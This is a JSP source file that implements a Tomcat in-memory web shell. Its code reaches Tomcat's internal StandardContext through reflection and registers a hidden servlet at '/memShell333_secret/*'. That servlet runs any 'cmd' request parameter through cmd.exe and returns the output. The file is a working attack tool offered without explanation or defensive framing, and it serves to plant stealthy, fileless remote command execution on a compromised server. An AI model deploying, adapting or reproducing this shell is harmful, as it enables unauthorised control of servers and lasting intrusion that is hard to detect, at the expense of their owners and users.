<%-- 
    Document   : ServletShell
    Created on : Jun 7, 2024, 2:49:09 PM
    Author     : datld7
--%>

<%@page import="org.apache.catalina.core.StandardWrapper"%>
<%@page import="org.apache.catalina.core.StandardContext"%>
<%@page import="org.apache.catalina.core.ApplicationContext"%>
<%@page import="org.apache.catalina.core.ApplicationContextFacade"%>
<%@page import="java.lang.reflect.Field"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="javax.servlet.Servlet"%>
<%@page import="javax.servlet.http.HttpServlet"%>
<%@page import="javax.servlet.http.HttpServletRequest"%>
<%@page import="javax.servlet.http.HttpServletResponse"%>
<%@page import="javax.servlet.ServletOutputStream"%>
<%@page language="java" contentType="text/html" pageEncoding="UTF-8"%>
<%
    class ServletShell extends javax.servlet.http.HttpServlet {
        
        @Override
        public void doGet(HttpServletRequest request, HttpServletResponse response) {
            try {
                if (request.getParameter("cmd") != null) {
                    System.out.println("Servle doGet!!");
                    Process ps = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    ServletOutputStream out = response.getOutputStream();
                    
                    String s = null;
                    String output = "";
                    
                    while ((s = br.readLine()) != null) {
                        output += s + "\n";
                    }
                    
                    out.print(output);
                    out.flush();
                    out.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
%>

<%
    if (request.getParameter("inject") != null) {
        //get StandardContext
        ServletContext servletCtx = request.getServletContext();
        ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletCtx;
        Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
        appCtxFacadeField.setAccessible(true);
        ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);
        Field appCtxField = ApplicationContext.class.getDeclaredField("context");
        appCtxField.setAccessible(true);
        StandardContext stdCtx = (StandardContext) appCtxField.get(appCtx);
        
        //create StandardWrapper object
        ServletShell servletShell = new ServletShell();
        StandardWrapper stdWrapper = new StandardWrapper();
        stdWrapper.setServletName("servletShell");
        stdWrapper.setServlet(servletShell);
        stdWrapper.setServletClass(servletShell.getClass().getName());
        
        // add StandardWrapper obj to Standard Context
        stdCtx.addChild(stdWrapper);
        // add mapping
        stdCtx.addServletMappingDecoded("/memShell333_secret/*", "servletShell");
        
        response.getWriter().println("Shell injected!");
    }
%>
